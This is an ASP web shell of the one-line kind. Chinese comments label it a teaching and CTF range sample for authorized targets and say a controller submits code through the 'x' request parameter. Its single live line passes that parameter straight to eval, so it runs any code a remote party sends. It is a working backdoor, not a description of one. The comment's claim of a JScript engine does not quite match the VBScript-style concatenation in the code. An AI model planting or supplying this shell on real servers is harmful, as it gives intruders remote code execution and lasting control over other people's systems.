<%
' 教学 / CTF 靶场样本：ASP (JScript 引擎) eval 型一句话马
' 仅用于你自有或已获明确授权的靶机环境。
' 连接参数名为 x；管理端通过此参数提交一小段 JScript 代码，
' 由 eval 注入执行（见 internal/shell）。

eval("" & Request("x"))
%>
